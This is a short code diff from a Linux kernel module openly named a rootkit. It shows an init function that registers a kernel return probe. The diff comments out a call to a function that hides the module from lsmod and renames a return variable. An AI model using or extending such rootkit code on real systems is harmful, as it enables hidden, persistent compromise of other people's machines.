@@ -7,11 +7,11 @@ MODULE_VERSION("0.0.1");
 
 static int __init rootkit_init(void) {
   printk(KERN_INFO "rootkit: init\n");
-  hide_from_lsmod();
+  //hide_from_lsmod();
   kprobes_init();
-  int kpret = register_kretprobe(&rootkit_kretprobe);
-  if (kpret < 0) {
-    printk(KERN_INFO "Error registering kretprobe: %d\n", kpret);
+  int ret = register_kretprobe(&rootkit_kretprobe);
+  if (ret < 0) {
+    printk(KERN_INFO "Error registering kretprobe: %d\n", ret);
     return -1;
   }
   printk(KERN_INFO "Planted return probe at %s: %p\n",
